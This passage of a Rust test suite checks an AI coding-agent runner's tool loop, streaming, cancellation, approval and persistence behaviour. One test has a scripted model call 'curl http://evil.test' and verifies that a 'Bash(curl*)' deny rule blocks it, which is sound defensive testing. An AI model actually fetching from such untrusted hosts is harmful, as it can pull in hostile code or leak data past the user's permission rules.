    /// token interrupts an in-flight tool call. It is a `Read` so the gate
    /// allows it straight through to execution with no approval prompt.
    struct HangTool {
        definition: ToolDefinition,
    }

    #[derive(Deserialize, JsonSchema)]
    struct HangArgs {}

    impl HangTool {
        fn new() -> Self {
            Self {
                definition: definition_for::<HangArgs>("hang", "Never returns"),
            }
        }
    }

    #[async_trait]
    impl TypedTool for HangTool {
        type Args = HangArgs;
        type Output = Value;

        fn definition(&self) -> &ToolDefinition {
            &self.definition
        }

        fn permission(&self, _args: &HangArgs, _ctx: &ToolContext) -> PermissionRequest {
            PermissionRequest::new("hang", PermissionAction::Read, None, "hang")
        }

        async fn run(&self, _args: HangArgs, ctx: &ToolContext) -> ToolOutput<Value> {
            // Cancel from inside the running tool, then never return: this
            // deterministically drives the runner's execute-stage `select!` to
            // the cancellation branch without pre-cancelling the token (which
            // would also race the model stage).
            ctx.cancel.cancel();
            std::future::pending().await
        }
    }

    /// A model whose `completion` never returns — used to test that a
    /// cancellation token interrupts an in-flight *model* request, not only a
    /// tool approval/execution.
    #[derive(Clone, Default)]
    struct HangModel;

    impl kuncode_core::completion::CompletionModel for HangModel {
        type Response = Value;
        type Client = ();

        fn make(_client: &Self::Client, _model: impl Into<String>) -> Self {
            Self
        }

        async fn completion(
            &self,
            _request: CompletionRequest,
        ) -> Result<CompletionResponse<Self::Response>, CompletionError> {
            std::future::pending().await
        }

        async fn stream(
            &self,
            _request: CompletionRequest,
        ) -> Result<CompletionStream, CompletionError> {
            // Hang while establishing the stream so cancellation tests still
            // race a never-resolving model call.
            std::future::pending().await
        }
    }

    /// Extracts the text of the tool-result user message at `index`.
    fn tool_result_text(session: &AgentSession, index: usize) -> String {
        match &session.messages()[index] {
            Message::User { content } => {
                let UserContent::ToolResult(result) = content.first() else {
                    panic!("expected tool result content at {index}");
                };
                let ToolResultContent::Text(text) = result.content.first();
                text.text_ref().to_string()
            }
            other => panic!("expected tool result user message at {index}, got {other:?}"),
        }
    }

    /// Extracts the tool-call id the tool-result user message at `index` answers.
    fn tool_result_id(session: &AgentSession, index: usize) -> String {
        match &session.messages()[index] {
            Message::User { content } => {
                let UserContent::ToolResult(result) = content.first() else {
                    panic!("expected tool result content at {index}");
                };
                result.id.clone()
            }
            other => panic!("expected tool result user message at {index}, got {other:?}"),
        }
    }

    async fn bash() -> Bash {
        Bash::from_current_dir()
            .await
            .expect("current directory should be a valid workspace")
    }

    #[derive(Clone, Default)]
    struct FakeModel {
        responses: Arc<Mutex<VecDeque<CompletionResponse<Value>>>>,
        requests: Arc<Mutex<Vec<CompletionRequest>>>,
    }

    impl FakeModel {
        fn new(responses: impl IntoIterator<Item = CompletionResponse<Value>>) -> Self {
            Self {
                responses: Arc::new(Mutex::new(responses.into_iter().collect())),
                requests: Arc::default(),
            }
        }

        fn requests(&self) -> Vec<CompletionRequest> {
            self.requests.lock().expect("requests lock").clone()
        }
    }

    impl kuncode_core::completion::CompletionModel for FakeModel {
        type Response = Value;
        type Client = ();

        fn make(_client: &Self::Client, _model: impl Into<String>) -> Self {
            Self::default()
        }

        async fn completion(
            &self,
            request: CompletionRequest,
        ) -> Result<CompletionResponse<Self::Response>, CompletionError> {
            self.requests.lock().expect("requests lock").push(request);
            Ok(self
                .responses
                .lock()
                .expect("responses lock")
                .pop_front()
                .expect("fake response queued"))
        }

        async fn stream(
            &self,
            request: CompletionRequest,
        ) -> Result<CompletionStream, CompletionError> {
            // Mirror `completion`: record the request, pop the queued response,
            // and replay it as a single terminal `Completed` event so the runner
            // exercises its streaming path against the same scripted responses.
            self.requests.lock().expect("requests lock").push(request);
            let response = self
                .responses
                .lock()
                .expect("responses lock")
                .pop_front()
                .expect("fake response queued");
            Ok(completed_stream(response))
        }
    }

    /// Replays a [`CompletionResponse`] as a one-event stream ending in
    /// [`StreamEvent::Completed`], for test models that script whole responses.
    /// `finish_reason` is irrelevant — the runner branches on the content.
    fn completed_stream<T>(response: CompletionResponse<T>) -> CompletionStream {
        let CompletionResponse { choice, usage, .. } = response;
        Box::pin(futures_util::stream::once(async move {
            Ok(StreamEvent::Completed {
                content: choice,
                usage,
                finish_reason: FinishReason::Stop,
            })
        }))
    }

    /// A model that streams reasoning + text deltas before the final answer, for
    /// asserting the runner forwards render deltas and still finalizes with
    /// `Assistant`.
    #[derive(Clone)]
    struct DeltaModel;

    impl kuncode_core::completion::CompletionModel for DeltaModel {
        type Response = Value;
        type Client = ();

        fn make(_client: &Self::Client, _model: impl Into<String>) -> Self {
            Self
        }

        async fn completion(
            &self,
            _request: CompletionRequest,
        ) -> Result<CompletionResponse<Self::Response>, CompletionError> {
            unimplemented!("delta model only streams")
        }

        async fn stream(
            &self,
            _request: CompletionRequest,
        ) -> Result<CompletionStream, CompletionError> {
            let events = vec![
                Ok(StreamEvent::ReasoningDelta("hmm".to_string())),
                Ok(StreamEvent::TextDelta("Hel".to_string())),
                Ok(StreamEvent::TextDelta("lo".to_string())),
                Ok(StreamEvent::Completed {
                    content: NonEmptyVec::new(AssistantContent::text("Hello")),
                    usage: Usage::default(),
                    finish_reason: FinishReason::Stop,
                }),
            ];
            Ok(Box::pin(futures_util::stream::iter(events)))
        }
    }

    #[tokio::test]
    async fn streaming_forwards_deltas_then_finalizes_with_assistant() {
        let observer = Arc::new(CollectingObserver::default());
        let runner =
            AgentRunner::new(DeltaModel, ToolRegistry::new()).with_observer(observer.clone());
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "hi")
            .await
            .expect("agent run should complete");

        let events = observer.events();
        let kinds: Vec<_> = events.iter().map(|e| event_label(&e.kind)).collect();
        assert_eq!(
            kinds,
            vec![
                "model_start",
                "reasoning_delta",
                "text_delta",
                "text_delta",
                "assistant",
            ],
        );

        // Deltas carry the streamed fragments; the final Assistant carries the
        // authoritative assembled text.
        let text_deltas: Vec<&str> = events
            .iter()
            .filter_map(|e| match &e.kind {
                EventKind::TextDelta { text } => Some(text.as_str()),
                _ => None,
            })
            .collect();
        assert_eq!(text_deltas, ["Hel", "lo"]);
        assert!(matches!(
            &events[4].kind,
            EventKind::Assistant { text, tool_calls } if text == "Hello" && tool_calls.is_empty()
        ));
    }

    fn response(content: AssistantContent) -> CompletionResponse<Value> {
        response_many(vec![content])
    }

    /// A response whose assistant message carries several content blocks (e.g.
    /// multiple tool calls in one turn).
    fn response_many(contents: Vec<AssistantContent>) -> CompletionResponse<Value> {
        CompletionResponse {
            choice: NonEmptyVec::try_from(contents).expect("at least one content block"),
            usage: Usage {
                input_tokens: 1,
                output_tokens: 2,
                total_tokens: 3,
                cached_input_tokens: 0,
                cache_creation_input_tokens: 0,
                reasoning_tokens: 0,
            },
            raw_response: serde_json::json!({}),
            message_id: None,
        }
    }

    #[tokio::test]
    async fn runs_tool_call_then_final_answer() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf s01" }),
            )),
            response(AssistantContent::text("done")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let runner = AgentRunner::new(model.clone(), registry);
        let mut session = AgentSession::new();

        let turn = runner
            .run_turn(&mut session, "inspect the workspace")
            .await
            .expect("agent run should complete");

        assert_eq!(turn.final_text(&session), "done");
        assert_eq!(turn.iterations, 2);
        assert_eq!(turn.usage.total_tokens, 6);
        assert_eq!(session.messages().len(), 4);

        let requests = model.requests();
        assert_eq!(requests.len(), 2);
        assert_eq!(requests[0].tools[0].name, "bash");
        assert_eq!(requests[1].tools[0].name, "bash");
        assert_eq!(requests[1].chat_history.len(), 3);

        match &session.messages()[2] {
            Message::User { content } => {
                let UserContent::ToolResult(result) = content.first() else {
                    panic!("expected tool result content");
                };
                let ToolResultContent::Text(text) = result.content.first();
                assert!(text.text_ref().contains("\"stdout\":\"s01\""));
            }
            other => panic!("expected tool result user message, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn run_turn_updates_transcript_in_place() {
        let model = FakeModel::new([response(AssistantContent::text("done"))]);
        let runner = AgentRunner::new(model, ToolRegistry::new());
        let mut session = AgentSession::new();

        let turn = runner
            .run_turn(&mut session, "finish this")
            .await
            .expect("agent turn should complete");

        assert_eq!(turn.final_text(&session), "done");
        assert_eq!(turn.final_message_index, 1);
        assert_eq!(session.messages().len(), 2);
    }

    #[tokio::test]
    async fn requests_keep_stable_prefix_between_tool_iterations() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf cache" }),
            )),
            response(AssistantContent::text("done")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let runner = AgentRunner::with_config(model.clone(), registry, AgentConfig::default())
            .with_system_prompt(SystemPrompt::new(vec![Box::new(IdentitySection::new(
                "be stable",
            ))]));
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "inspect the workspace")
            .await
            .expect("agent run should complete");

        let requests = model.requests();
        assert_eq!(requests.len(), 2);
        assert_eq!(requests[0].tools, requests[1].tools);
        assert!(
            requests[1]
                .chat_history
                .starts_with(&requests[0].chat_history)
        );
        assert_eq!(requests[0].chat_history.len(), 2);
        assert_eq!(requests[1].chat_history.len(), 4);
    }

    #[tokio::test]
    async fn stops_when_max_iterations_is_exhausted() {
        let model = FakeModel::new([response(AssistantContent::tool_call(
            "call_1",
            "bash",
            serde_json::json!({ "cmd": "printf loop" }),
        ))]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let runner = AgentRunner::with_config(
            model,
            registry,
            AgentConfig {
                max_iterations: 1,
                ..AgentConfig::default()
            },
        );
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "keep using tools")
            .await
            .expect_err("run should stop at the iteration budget");

        let AgentError::MaxIterations {
            max_iterations,
            messages,
            usage,
        } = err
        else {
            panic!("expected MaxIterations, got {err:?}");
        };

        assert_eq!(max_iterations, 1);
        // The partial transcript is preserved: user prompt, assistant tool
        // call, and the tool result appended before the budget was hit.
        assert_eq!(messages.len(), 3);
        assert_eq!(usage.total_tokens, 3);
    }

    #[tokio::test]
    async fn injects_system_prompt_as_first_message() {
        let model = FakeModel::new([response(AssistantContent::text("hi"))]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        // Only an identity section, so the assembled prompt is exactly the text
        // asserted below (no tools/plan blocks appended).
        let runner = AgentRunner::with_config(model.clone(), registry, AgentConfig::default())
            .with_system_prompt(SystemPrompt::new(vec![Box::new(IdentitySection::new(
                "be terse",
            ))]));
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "hello")
            .await
            .expect("run completes");

        // The system prompt is request-only, never part of the transcript.
        assert!(!matches!(
            session.messages().first(),
            Some(Message::System { .. })
        ));

        let request = &model.requests()[0];
        let Message::System { content } = request.chat_history.first() else {
            panic!("system prompt should be the first message sent to the model");
        };
        assert_eq!(content, "be terse");
    }

    #[tokio::test]
    async fn rejects_empty_transcript() {
        let runner = AgentRunner::new(FakeModel::default(), ToolRegistry::new());
        let mut session = AgentSession::new();

        let err = runner
            .continue_session(&mut session)
            .await
            .expect_err("empty transcript is invalid");

        assert!(matches!(err, AgentError::EmptyTranscript));
    }

    #[tokio::test]
    async fn deny_rule_blocks_tool_with_permission_denied() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "curl http://evil.test" }),
            )),
            response(AssistantContent::text("understood")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let mut policy = PermissionPolicy::new();
        policy
            .deny
            .extend(parse_rule("Bash(curl*)", RuleOrigin::ProjectSettings).unwrap());
        let runner = AgentRunner::new(model, registry).with_policy(policy);
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "fetch the script")
            .await
            .expect("a denial is model-recoverable, so the turn still completes");

        // The tool never ran; the model got a clear permission_denied result.
        let result = tool_result_text(&session, 2);
        assert!(result.contains("permission_denied"), "got {result}");
        assert!(result.contains("Bash(curl*)"), "got {result}");
    }

    #[tokio::test]
    async fn allow_always_grant_skips_the_second_prompt() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf one" }),
            )),
            response(AssistantContent::tool_call(
                "call_2",
                "bash",
                serde_json::json!({ "cmd": "printf two" }),
            )),
            response(AssistantContent::text("done")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let grant = parse_rule("Bash(printf*)", RuleOrigin::SessionGrant).unwrap()[0].clone();
        // Exactly ONE scripted outcome: if the second call also prompted, the
        // scripted approver would panic ("ran out of outcomes"). A clean pass
        // proves the session grant short-circuited the gate.
        let runner =
            AgentRunner::new(model, registry).with_approver(Arc::new(ScriptedApprover::new([
                ApprovalOutcome::AllowAlways(grant),
            ])));
        let mut session = AgentSession::new();

        let turn = runner
            .run_turn(&mut session, "print twice")
            .await
            .expect("both calls run, the second via the grant");

        assert_eq!(turn.final_text(&session), "done");
        assert!(tool_result_text(&session, 2).contains("\"stdout\":\"one\""));
        assert!(tool_result_text(&session, 4).contains("\"stdout\":\"two\""));
        // The grant is recorded on the session for later turns too.
        assert_eq!(session.permissions().allow_grants().len(), 1);
    }

    #[tokio::test]
    async fn abort_pairs_every_tool_call_with_a_result() {
        // One assistant turn emits TWO tool calls; the user aborts at the first
        // approval prompt. Both tool_calls must still get a tool_result, or the
        // assistant message dangles and the next turn's request is rejected.
        let model = FakeModel::new([response_many(vec![
            AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf one" }),
            ),
            AssistantContent::tool_call(
                "call_2",
                "bash",
                serde_json::json!({ "cmd": "printf two" }),
            ),
        ])]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let runner = AgentRunner::new(model, registry)
            .with_approver(Arc::new(ScriptedApprover::new([ApprovalOutcome::Abort])));
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "do two things")
            .await
            .expect_err("abort unwinds the whole turn");
        assert!(matches!(err, AgentError::Cancelled));

        // Transcript: user, assistant(2 tool_calls), tool_result(call_1),
        // tool_result(call_2) — every tool_call paired, so it is re-sendable.
        assert_eq!(session.messages().len(), 4);
        assert_eq!(tool_result_id(&session, 2), "call_1");
        assert_eq!(tool_result_id(&session, 3), "call_2");
        assert!(tool_result_text(&session, 2).contains("cancelled"));
        assert!(tool_result_text(&session, 3).contains("cancelled"));
    }

    #[tokio::test]
    async fn cancellation_token_interrupts_a_running_tool() {
        let model = FakeModel::new([response(AssistantContent::tool_call(
            "call_1",
            "hang",
            serde_json::json!({}),
        ))]);
        let mut registry = ToolRegistry::new();
        registry.register(HangTool::new());
        let runner = AgentRunner::new(model, registry);
        let mut session = AgentSession::new();

        // A fresh (un-cancelled) token: the model stage runs normally and the
        // `HangTool` cancels mid-run, so the interrupt lands specifically on the
        // tool-execution `select!`.
        let cancel = CancellationToken::new();

        let err = runner
            .run_turn_with(&mut session, "hang please", cancel)
            .await
            .expect_err("a tool that cancels mid-run interrupts the call");

        assert!(matches!(err, AgentError::Cancelled));
        // The cancelled tool_call is still paired with a synthetic result, so
        // the transcript stays re-sendable: user, assistant(1 call), tool_result.
        assert_eq!(session.messages().len(), 3);
        assert!(tool_result_text(&session, 2).contains("cancelled"));
    }

    #[tokio::test]
    async fn cancellation_token_interrupts_a_model_request() {
        let runner = AgentRunner::new(HangModel, ToolRegistry::new());
        let mut session = AgentSession::new();

        // Pre-cancelled token: the never-returning model loses the race to the
        // cancellation branch deterministically, proving the gate now wraps the
        // model call — not only tool approval/execution.
        let cancel = CancellationToken::new();
        cancel.cancel();

        let err = runner
            .run_turn_with(&mut session, "think forever", cancel)
            .await
            .expect_err("a cancelled token interrupts the model request");

        assert!(matches!(err, AgentError::Cancelled));
        // The turn aborted before any assistant message was appended: only the
        // user prompt is in the transcript.
        assert_eq!(session.messages().len(), 1);
    }

    #[tokio::test]
    async fn cancellable_yields_some_when_the_future_wins() {
        let cancel = CancellationToken::new();
        // An un-cancelled token never fires, so the ready future wins the race.
        assert_eq!(cancellable(&cancel, async { 42 }).await, Some(42));
    }

    #[tokio::test]
    async fn cancellable_is_biased_toward_an_already_cancelled_token() {
        let cancel = CancellationToken::new();
        cancel.cancel();
        // Even against an immediately-ready future, a pre-cancelled token wins:
        // `biased` polls the cancel branch first. This is the determinism the six
        // call sites rely on; a non-biased `select!` could pick either branch.
        assert_eq!(cancellable(&cancel, async { 42 }).await, None);
    }

    #[tokio::test]
    async fn cancellable_yields_none_when_cancelled_while_pending() {
        let cancel = CancellationToken::new();
        // Cancel from inside the racing future, then never return: the cancel
        // branch is the only one that can resolve, so the race ends in `None`.
        let fut = {
            let cancel = cancel.clone();
            async move {
                cancel.cancel();
                std::future::pending::<i32>().await
            }
        };
        assert_eq!(cancellable(&cancel, fut).await, None);
    }

    /// Records every event so a test can assert on the full stream.
    #[derive(Default)]
    struct CollectingObserver {
        events: Mutex<Vec<AgentEvent>>,
    }

    impl AgentObserver for CollectingObserver {
        fn on_event(&self, event: &AgentEvent) {
            self.events.lock().expect("events lock").push(event.clone());
        }
    }

    impl CollectingObserver {
        fn events(&self) -> Vec<AgentEvent> {
            self.events.lock().expect("events lock").clone()
        }
    }

    /// An observer that always panics, to prove the composite isolates it.
    struct PanicObserver;

    impl AgentObserver for PanicObserver {
        fn on_event(&self, _event: &AgentEvent) {
            panic!("observer blew up");
        }
    }

    /// A model whose `completion` fails, to exercise the model-stage error path.
    #[derive(Clone, Default)]
    struct ErrModel;

    impl kuncode_core::completion::CompletionModel for ErrModel {
        type Response = Value;
        type Client = ();

        fn make(_client: &Self::Client, _model: impl Into<String>) -> Self {
            Self
        }

        async fn completion(
            &self,
            _request: CompletionRequest,
        ) -> Result<CompletionResponse<Self::Response>, CompletionError> {
            Err(CompletionError::ResponseError("boom".to_string()))
        }

        async fn stream(
            &self,
            _request: CompletionRequest,
        ) -> Result<CompletionStream, CompletionError> {
            // A connection-level failure surfaces as the outer `Err`, exactly as
            // `completion` fails.
            Err(CompletionError::ResponseError("boom".to_string()))
        }
    }

    /// A raw [`Tool`] whose `call` returns a harness-level [`ToolError`] — the
    /// `AgentError::Tool` path, distinct from a model-recoverable failure. A
    /// `Read` action so the gate lets it through to execution unprompted.
    struct BrokenTool {
        definition: ToolDefinition,
    }

    impl BrokenTool {
        fn new() -> Self {
            Self {
                definition: definition_for::<HangArgs>("broken", "Always errors internally"),
            }
        }
    }

    #[async_trait]
    impl Tool for BrokenTool {
        fn definition(&self) -> &ToolDefinition {
            &self.definition
        }

        fn permission(
            &self,
            _args: &Value,
            _ctx: &ToolContext,
        ) -> Result<PermissionRequest, ToolOutput> {
            Ok(PermissionRequest::new(
                "broken",
                PermissionAction::Read,
                None,
                "broken",
            ))
        }

        async fn call(&self, _args: Value, _ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
            Err(ToolError::Internal("kaboom".to_string()))
        }
    }

    /// Stable label for an [`EventKind`], for asserting on the sequence shape.
    fn event_label(kind: &EventKind) -> &'static str {
        match kind {
            EventKind::ModelStart => "model_start",
            EventKind::TextDelta { .. } => "text_delta",
            EventKind::ReasoningDelta { .. } => "reasoning_delta",
            EventKind::Assistant { .. } => "assistant",
            EventKind::ToolStart { .. } => "tool_start",
            EventKind::ToolEnd { .. } => "tool_end",
            EventKind::Error { .. } => "error",
            EventKind::TodoUpdate { .. } => "todo_update",
            EventKind::Warning { .. } => "warning",
        }
    }

    /// The tool_call ids the transcript's tool_result messages answer, in order.
    fn tool_result_ids(session: &AgentSession) -> Vec<String> {
        session
            .messages()
            .iter()
            .filter_map(|message| match message {
                Message::User { content } => match content.first() {
                    UserContent::ToolResult(result) => Some(result.id.clone()),
                    _ => None,
                },
                _ => None,
            })
            .collect()
    }

    /// A degraded session store warns exactly once — at the end of the turn
    /// whose pushes hit the failure — and never again on later turns (the
    /// take-and-clear contract), while the turns themselves stay unaffected.
    /// `iteration` is `None`: the failure belongs to no model call.
    #[tokio::test]
    async fn persistence_failure_emits_warning_once() {
        let model = FakeModel::new([
            response(AssistantContent::text("first")),
            response(AssistantContent::text("second")),
        ]);
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, ToolRegistry::new()).with_observer(observer.clone());
        let mut session = AgentSession::new();
        session.mark_persistence_failed("disk on fire");

        runner
            .run_turn(&mut session, "hi")
            .await
            .expect("first turn should complete despite degraded persistence");
        runner
            .run_turn(&mut session, "again")
            .await
            .expect("second turn should complete");

        let warnings: Vec<_> = observer
            .events()
            .into_iter()
            .filter(|e| matches!(e.kind, EventKind::Warning { .. }))
            .collect();
        assert_eq!(warnings.len(), 1, "one failure, one warning");
        assert!(matches!(
            &warnings[0].kind,
            EventKind::Warning { message } if message.contains("disk on fire")
        ));
        assert_eq!(warnings[0].iteration, None);
    }

    /// With no observer there is nowhere to deliver the one-shot report, so
    /// the runner must NOT drain it — the error stays in the session for a
    /// later observer-bearing runner instead of vanishing into a no-op emit.
    #[tokio::test]
    async fn persistence_failure_survives_observerless_runner() {
        let model = FakeModel::new([response(AssistantContent::text("done"))]);
        let runner = AgentRunner::new(model, ToolRegistry::new());
        let mut session = AgentSession::new();
        session.mark_persistence_failed("disk on fire");

        runner
            .run_turn(&mut session, "hi")
            .await
            .expect("turn should complete");

        assert!(
            session.take_persistence_error().is_some(),
            "the un-reported error must remain takeable"
        );
    }

    #[tokio::test]
    async fn run_turn_persists_messages_to_session_store() {
        let root = TestDir::new();
        let store = Arc::new(
            SqliteSessionStore::open(root.path().join("sessions.sqlite3"))
                .await
                .expect("store should open"),
        );
        let session_id = store
            .create_session(NewSession::new(root.path().to_path_buf()))
            .await
            .expect("session should be created");
        let model = FakeModel::new([response(AssistantContent::text("done"))]);
        let runner = AgentRunner::new(model, ToolRegistry::new()).with_session_store(store.clone());
        let mut session = AgentSession::new();
        session.attach_session_id(session_id.clone());

        runner
            .run_turn(&mut session, "hi")
            .await
            .expect("turn should complete");

        let entries = store
            .replay_after(&session_id, Seq::ZERO)
            .await
            .expect("journal should replay");
        let messages: Vec<Message> = entries
            .into_iter()
            .map(|entry| entry.into_message().expect("message payload"))
            .collect();
        assert_eq!(messages, session.messages());
    }

    #[tokio::test]
    async fn emits_full_event_sequence_on_success() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf s01" }),
            )),
            response(AssistantContent::text("done")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, registry).with_observer(observer.clone());
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "inspect the workspace")
            .await
            .expect("agent run should complete");

        let events = observer.events();
        let kinds: Vec<_> = events.iter().map(|e| event_label(&e.kind)).collect();
        assert_eq!(
            kinds,
            vec![
                "model_start",
                "assistant",
                "tool_start",
                "tool_end",
                "model_start",
                "assistant",
            ],
        );

        // First assistant carries the tool call; the final one carries none.
        assert!(matches!(
            &events[1].kind,
            EventKind::Assistant { tool_calls, .. } if tool_calls == &["call_1"]
        ));
        assert!(matches!(
            &events[5].kind,
            EventKind::Assistant { tool_calls, .. } if tool_calls.is_empty()
        ));
        assert!(matches!(
            &events[3].kind,
            EventKind::ToolEnd {
                ok: true,
                error: None,
                ..
            }
        ));
        // Happy path: no terminal Error, every event owns a model call, and seq
        // is strictly monotonic from 0.
        assert!(
            !events
                .iter()
                .any(|e| matches!(e.kind, EventKind::Error { .. }))
        );
        assert!(events.iter().all(|e| e.iteration.is_some()));
        assert!(events.iter().enumerate().all(|(i, e)| e.seq == i as u64));
    }

    #[tokio::test]
    async fn todo_write_emits_a_todo_update_after_tool_end() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "todo_write",
                serde_json::json!({
                    "todos": [
                        { "content": "Plan it", "active_form": "Planning it", "status": "in_progress" }
                    ]
                }),
            )),
            response(AssistantContent::text("done")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(TodoWrite::new());
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, registry).with_observer(observer.clone());
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "make a plan")
            .await
            .expect("agent run should complete");

        let events = observer.events();
        let kinds: Vec<_> = events.iter().map(|e| event_label(&e.kind)).collect();
        // `Meta` is allow-by-default, so the call runs unprompted and the plan
        // update lands right after the tool's terminal event.
        assert_eq!(
            kinds,
            vec![
                "model_start",
                "assistant",
                "tool_start",
                "tool_end",
                "todo_update",
                "model_start",
                "assistant",
            ],
        );
        let todos = events.iter().find_map(|e| match &e.kind {
            EventKind::TodoUpdate { todos } => Some(todos.clone()),
            _ => None,
        });
        let todos = todos.expect("a todo_update was emitted");
        assert_eq!(todos.len(), 1);
        assert_eq!(todos[0].content, "Plan it");
        // The session store holds the same plan the event carried.
        assert_eq!(session.todos_snapshot(), todos);
    }

    #[tokio::test]
    async fn rejected_todo_write_emits_no_todo_update() {
        // Two in_progress items fail validation: the call still produces a
        // ToolEnd(ok:false), but the plan generation never advances, so no
        // TodoUpdate is emitted.
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "todo_write",
                serde_json::json!({
                    "todos": [
                        { "content": "a", "active_form": "a…", "status": "in_progress" },
                        { "content": "b", "active_form": "b…", "status": "in_progress" }
                    ]
                }),
            )),
            response(AssistantContent::text("understood")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(TodoWrite::new());
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, registry).with_observer(observer.clone());
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "make a bad plan")
            .await
            .expect("a validation failure is model-recoverable");

        let labels: Vec<_> = observer
            .events()
            .iter()
            .map(|e| event_label(&e.kind))
            .collect();
        assert!(!labels.contains(&"todo_update"), "got {labels:?}");
        // The plan was left empty by the rejected write.
        assert!(session.todos_snapshot().is_empty());
    }

    /// Counts injected plan-nag reminders in a transcript.
    fn reminder_count(session: &AgentSession) -> usize {
        session
            .messages()
            .iter()
            .filter(|m| match m {
                Message::User { content } => matches!(
                    content.first(),
                    UserContent::Text(t) if t.text_ref() == TODO_REMINDER
                ),
                _ => false,
            })
            .count()
    }

    #[tokio::test]
    async fn plan_nag_fires_after_the_idle_interval() {
        // Two tool-only calls leave the plan untouched; on the third iteration
        // the idle counter hits the interval and a reminder is injected before
        // the model call.
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "c1",
                "bash",
                serde_json::json!({ "cmd": "printf one" }),
            )),
            response(AssistantContent::tool_call(
                "c2",
                "bash",
                serde_json::json!({ "cmd": "printf two" }),
            )),
            response(AssistantContent::text("done")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let runner = AgentRunner::with_config(
            model,
            registry,
            AgentConfig {
                todo_reminder_interval: Some(2),
                ..AgentConfig::default()
            },
        );
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "keep working")
            .await
            .expect("agent run should complete");

        // Exactly one nudge, and it is not the opening user message — it was
        // injected mid-loop once the plan sat idle for the interval.
        assert_eq!(reminder_count(&session), 1);
    }

    #[tokio::test]
    async fn a_todo_write_resets_the_plan_nag() {
        // Same iteration count as the firing case, but a `todo_write` up front
        // advances the plan generation and resets the idle counter, so the
        // interval is never reached and no reminder is injected.
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "c1",
                "todo_write",
                serde_json::json!({
                    "todos": [
                        { "content": "Step", "active_form": "Stepping", "status": "in_progress" }
                    ]
                }),
            )),
            response(AssistantContent::tool_call(
                "c2",
                "bash",
                serde_json::json!({ "cmd": "printf go" }),
            )),
            response(AssistantContent::text("done")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        registry.register(TodoWrite::new());
        let runner = AgentRunner::with_config(
            model,
            registry,
            AgentConfig {
                todo_reminder_interval: Some(2),
                ..AgentConfig::default()
            },
        );
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "plan then work")
            .await
            .expect("agent run should complete");

        assert_eq!(reminder_count(&session), 0);
        // The plan really was set, which is what reset the counter.
        assert_eq!(session.todos_snapshot().len(), 1);
    }

    #[tokio::test]
    async fn abort_mirrors_tool_results_and_ends_with_cancelled_error() {
        let model = FakeModel::new([response_many(vec![
            AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf one" }),
            ),
            AssistantContent::tool_call(
                "call_2",
                "bash",
                serde_json::json!({ "cmd": "printf two" }),
            ),
        ])]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, registry)
            .with_approver(Arc::new(ScriptedApprover::new([ApprovalOutcome::Abort])))
            .with_observer(observer.clone());
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "do two things")
            .await
            .expect_err("abort unwinds the whole turn");
        assert!(matches!(err, AgentError::Cancelled));

        let events = observer.events();
        // Mirror invariant: one ToolEnd per transcript tool_result, same ids.
        let tool_ends: Vec<_> = events
            .iter()
            .filter_map(|e| match &e.kind {
                EventKind::ToolEnd { tool_call_id, .. } => Some(tool_call_id.clone()),
                _ => None,
            })
            .collect();
        assert_eq!(tool_ends, vec!["call_1", "call_2"]);
        assert_eq!(tool_ends, tool_result_ids(&session));

        // Exactly one terminal Error, kind "cancelled", and it is last.
        let errors: Vec<_> = events
            .iter()
            .filter(|e| matches!(e.kind, EventKind::Error { .. }))
            .collect();
        assert_eq!(errors.len(), 1);
        assert!(matches!(
            &errors[0].kind,
            EventKind::Error { kind, .. } if kind == "cancelled"
        ));
        assert!(matches!(
            events.last().map(|e| &e.kind),
